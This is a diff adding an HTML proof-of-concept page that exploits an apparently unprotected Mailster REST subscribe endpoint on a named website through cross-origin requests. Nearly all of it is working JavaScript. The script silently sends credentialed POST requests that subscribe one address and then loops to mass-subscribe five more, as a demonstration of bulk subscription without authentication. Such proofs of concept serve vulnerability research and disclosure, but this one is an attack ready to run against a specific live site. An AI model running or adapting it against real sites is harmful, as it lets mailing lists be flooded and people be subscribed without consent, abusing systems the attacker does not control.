@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head><title>PoC - Mailster CORS Unauthenticated Subscription</title></head>
+<body>
+<h1>PoC: Mass Subscription via Mailster REST API + CORS</h1>
+<p>Target: https://cyberc4st.com</p>
+<p>This page silently subscribes the visitor to CyberC4ST newsletter.</p>
+<script>
+// Silent subscription via REST API (no nonce, no auth required)
+fetch('https://cyberc4st.com/wp-json/mailster/v1/forms/1/subscribe', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({email: 'poc-victim@example.com', firstname: 'PoC'})
+}).then(r => r.json()).then(d => {
+  document.getElementById('result').innerHTML = 'SUBSCRIBED: ' + JSON.stringify(d);
+});
+
+// Mass subscription proof (5 emails)
+for (let i = 1; i <= 5; i++) {
+  fetch('https://cyberc4st.com/wp-json/mailster/v1/forms/1/subscribe', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({email: 'mass-poc-' + i + '@example.com', firstname: 'Mass' + i})
+  }).then(r => r.json()).then(d => {
+    document.getElementById('mass').innerHTML += JSON.stringify(d) + '<br>';
+  });
+}
+</script>
+<div id="result">Waiting...</div>
+<div id="mass"></div>
+</body>
+</html>
